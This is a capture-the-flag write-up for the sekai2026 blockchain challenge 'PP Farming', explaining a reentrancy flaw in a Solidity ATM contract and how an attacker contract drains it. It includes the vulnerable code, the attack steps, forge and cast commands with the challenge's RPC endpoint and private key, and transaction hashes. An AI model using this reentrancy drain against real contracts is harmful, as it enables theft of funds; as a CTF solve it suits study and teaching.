---
title: "PP Farming"
description: "PerformancePointATM.withdrawPP() sends ETH to msg.sender before clearing scores[msg.sender]. A contract with a payable receive() function can reenter withdrawPP() repeatedly while its score is still nonzero,…"
published: "2026-06-27"
updated: "2026-06-27"
event: "sekai2026"
category: "Blockchain"
kind: "writeup"
status: "solved"
tags: ["Blockchain", "sekai2026", "Writeup"]
readingTime: 1
wordCount: 146
featured: false
sourcePath: "~/ctf/sekai2026/blockchain_pp-farming/WRITEUP.md"
---

# PP Farming

## Summary

`PerformancePointATM.withdrawPP()` sends ETH to `msg.sender` before clearing
`scores[msg.sender]`. A contract with a payable `receive()` function can reenter
`withdrawPP()` repeatedly while its score is still nonzero, draining the ATM.

## Vulnerability

The vulnerable function is:

```solidity
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");
    (bool result, ) = msg.sender.call{value: score}("");
    require(result, "Transfer failed");
    scores[msg.sender] = 0;
}
```

Because the score is cleared after the external call, the attacker receives ETH
and reenters before `scores[attacker]` becomes zero.

The solve condition is:

```solidity
function isSolved() view public returns (bool) {
    return address(this).balance == 0;
}
```

The deployment script funded the ATM with `10 ether`, so donating `1 ether` to an
attacker contract and reentering ten times is enough.

## Reproduction

The attacker contract in `scratch/PPFarmAttacker.sol`:

1. Calls `donatePP{value: 1 ether}(address(this))`.
2. Calls `withdrawPP()`.
3. In `receive()`, calls `withdrawPP()` again while the ATM has at least one
   withdrawal chunk remaining.
4. Sweeps the drained ETH back to the player.

Run:

```bash
python3 solve.py
```

Or manually:

```bash
RPC='https://eth.chals.sekai.team/SvaQgXyTJezkFWgRkBOPPxaC/main'
KEY='70d47705d2481762688b85144297e03a2a54f0086f407910ec91869cffe9a692'
ATM='0xF2E774dAfDdd8Cee3901A06e6F05BebF880E56fE'

forge create "$PWD/scratch/PPFarmAttacker.sol:PPFarmAttacker" \
  --broadcast \
  --rpc-url "$RPC" \
  --private-key "$KEY" \
  --constructor-args "$ATM"

# Set this to the `Deployed to:` address from the previous command.
ATTACKER='0x...'

cast send "$ATTACKER" 'attack()' \
  --value 1ether \
  --gas-limit 5000000 \
  --rpc-url "$RPC" \
  --private-key "$KEY"

cast balance "$ATM" --rpc-url "$RPC"
cast call "$ATM" 'isSolved()(bool)' --rpc-url "$RPC"
```

## Verified Solve

On the provided instance:

- Attacker deployed at `0xE67811970C977b194f7b55565af7015b010436B8`.
- Deploy tx: `0xf784cf6e5ecdfc0f96a1e4e2df9a32be04b73898723011dd0838f7eae40311bb`.
- Exploit tx: `0x1e0e2c67fecdb740f195bff54929dca5a05fa3bbc03d9b4263055e0d53ffd0aa`.
- Final ATM balance: `0`.
- `isSolved()`: `true`.
